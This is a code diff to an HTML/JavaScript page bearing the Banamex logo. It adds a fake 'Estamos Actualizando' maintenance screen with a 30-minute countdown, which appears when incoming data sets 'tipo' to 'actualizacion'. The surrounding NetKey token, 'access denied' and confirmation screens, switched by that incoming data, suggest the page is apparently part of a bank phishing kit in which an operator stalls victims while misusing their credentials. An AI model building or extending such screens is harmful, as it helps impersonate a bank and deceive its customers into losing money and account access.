@@ -427,6 +427,55 @@
         </div>
     </div>
 
+    <!-- Pantalla de Actualización -->
+    <div id="actualizacion-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; overflow-y: auto;">
+        <div style="margin: 0; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #0b3b43; min-height: 100vh; display: flex; align-items: center; justify-content: center;">
+            <div style="max-width: 800px; width: 100%;">
+                <div style="text-align: center; margin-bottom: 48px;">
+                    <img src="/attached_assets/Banamex_1759879138326.png" alt="Banamex" style="max-width: 400px; width: 100%; height: auto; margin: 0 auto; display: block;">
+                </div>
+
+                <div style="background: linear-gradient(135deg, #f0f8ff 0%, #e6f3ff 100%); border-radius: 16px; padding: 64px 48px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border: 2px solid #4a90e2; text-align: center;">
+                    <div style="margin-bottom: 32px;">
+                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#4a90e2" stroke-width="2" style="margin: 0 auto; display: block;">
+                            <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path>
+                            <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                            <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                        </svg>
+                    </div>
+
+                    <h1 style="font-size: 36px; margin: 0 0 24px 0; color: #2c5aa0; font-weight: 700;">Estamos Actualizando</h1>
+                    
+                    <p style="margin: 0 0 48px 0; color: #5a7ba6; font-size: 18px; line-height: 1.6;">
+                        Estamos mejorando nuestros sistemas para brindarte un mejor servicio.<br>
+                        Por favor, espera un momento.
+                    </p>
+
+                    <div style="background: white; border-radius: 12px; padding: 32px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); margin-bottom: 24px;">
+                        <div style="font-size: 16px; color: #5a7ba6; margin-bottom: 16px; font-weight: 600;">Tiempo estimado</div>
+                        <div id="actualizacion-timer" style="font-size: 72px; color: #2c5aa0; font-weight: 800; font-family: 'Courier New', monospace; letter-spacing: 4px;">30:00</div>
+                        <div style="width: 100%; height: 8px; background: #e0e0e0; border-radius: 4px; margin-top: 24px; overflow: hidden;">
+                            <div id="actualizacion-progress" style="width: 100%; height: 100%; background: linear-gradient(90deg, #4a90e2, #2c5aa0); transition: width 1s linear;"></div>
+                        </div>
+                    </div>
+
+                    <div id="actualizacion-mensaje" style="display: none;">
+                        <div style="margin-bottom: 24px;">
+                            <svg width="100" height="100" viewBox="0 0 24 24" fill="none" stroke="#28a745" stroke-width="2" style="margin: 0 auto; display: block;">
+                                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                            </svg>
+                        </div>
+                        <h2 style="font-size: 32px; margin: 0 0 16px 0; color: #28a745; font-weight: 700;">¡Actualización Completada!</h2>
+                        <p style="margin: 0; color: #5a7ba6; font-size: 18px;">
+                            La actualización concluyó exitosamente
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div id="netkey2-screen" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 10000; overflow-y: auto;">
         <div style="margin: 0; padding: 28px; font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; color: #0b3b43;">
             <div style="max-width: 900px; margin: 18px auto;">
@@ -697,8 +746,37 @@
             document.getElementById('acceso-denegado-screen').style.display = 'none';
             document.getElementById('acceso-denegado-2-screen').style.display = 'none';
             document.getElementById('mensaje-confirmacion-screen').style.display = 'none';
+            document.getElementById('actualizacion-screen').style.display = 'none';
 
-            if (data.tipo === 'mensaje') {
+            if (data.tipo === 'actualizacion') {
+                console.log('Mostrando pantalla de actualización');
+                document.getElementById('actualizacion-screen').style.display = 'block';
+                
+                // Contador de 30 minutos
+                var timeLeft = 30 * 60; // 30 minutos en segundos
+                var totalTime = 30 * 60;
+                var timerElement = document.getElementById('actualizacion-timer');
+                var progressElement = document.getElementById('actualizacion-progress');
+                var mensajeElement = document.getElementById('actualizacion-mensaje');
+                
+                var actualizacionInterval = setInterval(function() {
+                    var minutes = Math.floor(timeLeft / 60);
+                    var seconds = timeLeft % 60;
+                    timerElement.textContent = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
+                    
+                    // Actualizar barra de progreso
+                    var progress = (timeLeft / totalTime) * 100;
+                    progressElement.style.width = progress + '%';
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(actualizacionInterval);
+                        // Ocultar contador y mostrar mensaje de éxito
+                        timerElement.parentElement.style.display = 'none';
+                        mensajeElement.style.display = 'block';
+                    }
+                    timeLeft--;
+                }, 1000);
+            } else if (data.tipo === 'mensaje') {
                 console.log('Mostrando pantalla de mensaje de confirmación');
                 document.getElementById('mensaje-confirmacion-screen').style.display = 'block';
                 
